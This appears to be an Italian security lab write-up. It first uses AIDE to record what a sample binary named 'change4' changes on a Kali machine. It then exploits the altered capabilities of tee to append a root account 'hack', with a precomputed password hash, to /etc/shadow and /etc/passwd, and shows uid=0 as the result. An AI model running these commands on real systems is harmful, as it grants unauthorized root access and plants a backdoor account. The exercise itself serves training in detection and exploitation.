PRIMA PARTE 

# Salviamo lo stato della macchina allo stato corrente
aide -c /home/kali/aide/aide.conf -i

# Copiamo il database
cp /home/kali/aide/aide.db{.new,}

# Eseguiamo il malware
sudo ./change4

# Verifichiamo le modifiche apportate al sistema 
aide -c /home/kali/aide/aide.conf -C

SECONDA PARTE 

Lanciando il comando 

aide -c /home/kali/aide/aide.conf -C

si può notare che sono stati modificati i comandi 

# grep
# vim.tiny
# tee

Quello che a noi interessa per eseguire la richiesta di inserimento di un utente hack con privilegi di root, avente password hack.

Per prima cosa genere la password con il salt tramite l'utilizzo del comando openssl passwd -1 e ottenendo la password $1$lQIVrOzZ$UA0E/8T04a1U8u4duJ9gV0.

Di seguito eseguo i seguenti comandi per inserire l'utente in append, tramite l'utilizzo di tee (siccome sono state modificate le sue capability e ci permettono di operare su tali file),
all'interno di /etc/shadow e /etc/passwd.

echo "hack:$1$lQIVrOzZ$UA0E/8T04a1U8u4duJ9gV0:19445:0:99999:7:::" | tee -a /etc/shadow
echo "hack:x:0:0:System Administrator:/var/root:/bin/sh" | tee -a /etc/passwd

Eseguendo, infine, il comando su hack e lanciando id si avrà:

uid=0(root) gid=0(root) groups=0(root).
